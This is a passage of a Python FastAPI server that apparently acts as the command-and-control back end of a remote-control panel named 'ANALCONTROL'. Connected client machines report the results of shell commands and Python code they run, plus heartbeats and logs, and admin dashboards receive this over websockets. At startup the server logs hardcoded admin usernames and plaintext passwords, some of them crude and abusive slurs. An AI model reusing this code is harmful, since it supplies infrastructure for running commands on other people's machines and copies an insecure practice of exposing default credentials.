        theme = user.get("theme", "cyberpunk")
        return {
            "success": True,
            "theme": theme,
            "username": user.get("email")
        }
    except Exception as e:
        logger.error(f"Get theme error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

# ========== WEBSOCKET ENDPOINTS ==========
@app.websocket("/ws/admin")
async def websocket_admin(websocket: WebSocket):
    """WebSocket endpoint for admin dashboard"""
    try:
        await manager.connect_admin(websocket)
        
        # Send initial status
        await websocket.send_json({
            "type": "status",
            "message": "Connected to admin dashboard",
            "active_clients": len(manager.client_connections),
            "timestamp": datetime.utcnow().isoformat()
        })
        
        while True:
            try:
                data = await websocket.receive_json()
                
                # Handle ping
                if data.get("type") == "ping":
                    await websocket.send_json({
                        "type": "pong",
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    
            except WebSocketDisconnect:
                break
            except Exception as e:
                logger.error(f"Error receiving WebSocket message: {e}")
                continue
            
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception as e:
        logger.error(f"Admin WebSocket error: {e}")
        manager.disconnect(websocket)

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    """WebSocket endpoint for client connections"""
    try:
        await manager.connect_client(websocket, client_id)
        
        # Send welcome message
        await websocket.send_json({
            "type": "welcome",
            "message": f"Connected to server as {client_id}",
            "server_time": datetime.utcnow().isoformat()
        })
        
        while True:
            try:
                data = await websocket.receive_json()
                data_type = data.get("type")
                
                if data_type == "heartbeat":
                    # Update last seen
                    if client_id in db.clients:
                        db.clients[client_id]["last_seen"] = datetime.utcnow().isoformat()
                        db.clients[client_id]["online"] = True
                    
                    # Update Supabase
                    if supabase:
                        try:
                            supabase.table("clients")\
                                .update({
                                    "last_seen": datetime.utcnow().isoformat(),
                                    "online": True
                                })\
                                .eq("client_id", client_id)\
                                .execute()
                        except Exception as e:
                            logger.error(f"Supabase heartbeat update error: {e}")
                    
                    # Send heartbeat response
                    await websocket.send_json({
                        "type": "heartbeat_response",
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    
                elif data_type == "command_result":
                    # Update command status
                    command_id = data.get("command_id")
                    
                    # Update in-memory
                    for cmd in db.commands:
                        if cmd["id"] == command_id:
                            cmd["status"] = "completed"
                            cmd["result"] = data.get("result")
                            cmd["completed_at"] = datetime.utcnow().isoformat()
                            cmd["error"] = data.get("error", "")
                            break
                    
                    # Update Supabase
                    if supabase:
                        try:
                            supabase.table("commands")\
                                .update({
                                    "status": "completed",
                                    "result": data.get("result"),
                                    "error": data.get("error", ""),
                                    "completed_at": datetime.utcnow().isoformat()
                                })\
                                .eq("id", command_id)\
                                .execute()
                        except Exception as e:
                            logger.error(f"Supabase command result update error: {e}")
                    
                    # Notify admins
                    await manager.notify_admins({
                        "type": "command_result",
                        "client_id": client_id,
                        "command_id": command_id,
                        "command": data.get("command"),
                        "result": data.get("result"),
                        "error": data.get("error"),
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    
                elif data_type == "python_result":
                    # Handle Python execution result
                    command_id = data.get("command_id")
                    
                    # Store in-memory
                    for cmd in db.commands:
                        if cmd["id"] == command_id:
                            cmd["status"] = "completed"
                            cmd["result"] = data.get("result")
                            cmd["completed_at"] = datetime.utcnow().isoformat()
                            cmd["error"] = data.get("error", "")
                            break
                    
                    # Update Supabase
                    if supabase:
                        try:
                            supabase.table("commands")\
                                .update({
                                    "status": "completed",
                                    "result": data.get("result"),
                                    "error": data.get("error", ""),
                                    "completed_at": datetime.utcnow().isoformat()
                                })\
                                .eq("id", command_id)\
                                .execute()
                        except Exception as e:
                            logger.error(f"Supabase Python result update error: {e}")
                    
                    # Notify admins
                    await manager.notify_admins({
                        "type": "python_result",
                        "client_id": client_id,
                        "command_id": command_id,
                        "filename": data.get("filename"),
                        "result": data.get("result"),
                        "error": data.get("error"),
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    
                elif data_type == "log":
                    # Store log
                    log_entry = {
                        "id": str(uuid.uuid4()),
                        "client_id": client_id,
                        "log_type": data.get("log_type", "info"),
                        "message": data.get("message", ""),
                        "created_at": datetime.utcnow().isoformat()
                    }
                    
                    db.logs.append(log_entry)
                    
                    # Store in Supabase
                    if supabase:
                        try:
                            supabase.table("logs").insert({
                                "client_id": client_id,
                                "log_type": data.get("log_type", "info"),
                                "message": data.get("message", ""),
                                "created_at": datetime.utcnow().isoformat()
                            }).execute()
                        except Exception as e:
                            logger.error(f"Supabase log storage error: {e}")
                    
                    # Notify admins
                    await manager.notify_admins({
                        "type": "client_log",
                        "client_id": client_id,
                        "log_type": data.get("log_type", "info"),
                        "message": data.get("message", ""),
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    
            except WebSocketDisconnect:
                break
            except Exception as e:
                logger.error(f"Error processing WebSocket message: {e}")
                continue
                
    except WebSocketDisconnect:
        # Mark client as offline
        if client_id in db.clients:
            db.clients[client_id]["online"] = False
            db.clients[client_id]["ws_online"] = False
        manager.disconnect(websocket)
    except Exception as e:
        logger.error(f"Client WebSocket error: {e}")
        # Mark client as offline
        if client_id in db.clients:
            db.clients[client_id]["online"] = False
            db.clients[client_id]["ws_online"] = False
        manager.disconnect(websocket)

# ========== ERROR HANDLERS ==========
@app.exception_handler(HTTPException)
async def http_exception_handler(request: Request, exc: HTTPException):
    """Handle HTTP exceptions"""
    return JSONResponse(
        status_code=exc.status_code,
        content={
            "success": False,
            "detail": exc.detail,
            "path": request.url.path,
            "timestamp": datetime.utcnow().isoformat()
        }
    )

@app.exception_handler(Exception)
async def general_exception_handler(request: Request, exc: Exception):
    """Handle all other exceptions"""
    logger.error(f"Unhandled exception: {exc}", exc_info=True)
    return JSONResponse(
        status_code=500,
        content={
            "success": False,
            "detail": "Internal server error",
            "path": request.url.path,
            "timestamp": datetime.utcnow().isoformat()
        }
    )

# ========== SERVE FRONTEND ==========
@app.get("/")
async def serve_frontend():
    """Serve the frontend HTML"""
    try:
        # Try to read the frontend HTML file
        with open("frontend.html", "r", encoding="utf-8") as f:
            html_content = f.read()
        return HTMLResponse(content=html_content)
    except:
        # Return a simple message if frontend file not found
        return JSONResponse({
            "message": "ANALCONTROL API is running",
            "version": "3.0",
            "endpoints": {
                "login": "/api/login",
                "docs": "/docs",
                "health": "/api/health",
                "ws_admin": "/ws/admin",
                "ws_client": "/ws/client/{client_id}"
            },
            "note": "Place frontend.html in the same directory to serve the web interface"
        })

# ========== APPLICATION STARTUP ==========
@app.on_event("startup")
async def startup_event():
    """Initialize application on startup"""
    logger.info("=" * 60)
    logger.info("🚀 ANALCONTROL API v3.0 Starting...")
    logger.info(f"📡 Port: {PORT}")
    logger.info(f"🔗 Backend URL: {BACKEND_URL}")
    logger.info(f"📊 Supabase: {'Connected' if supabase else 'Not Connected'}")
    logger.info("🔗 WebSocket endpoints:")
    logger.info("   • Admin: /ws/admin")
    logger.info("   • Client: /ws/client/{client_id}")
    logger.info("📚 Documentation: /docs")
    logger.info("👤 Default users:")
    logger.info("   • xotiic/40671Mps19* (Admin)")
    logger.info("   • admin/admin123 (Admin)")
    logger.info("   • nathan/femboy67 (Admin with femboy theme)")
    logger.info("   • kizer/kidraper67 (Admin)")
    logger.info("=" * 60)
    logger.info("✅ Application startup complete")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        app,
        host="0.0.0.0",
        port=PORT,
        log_level="info",
        access_log=True
    )
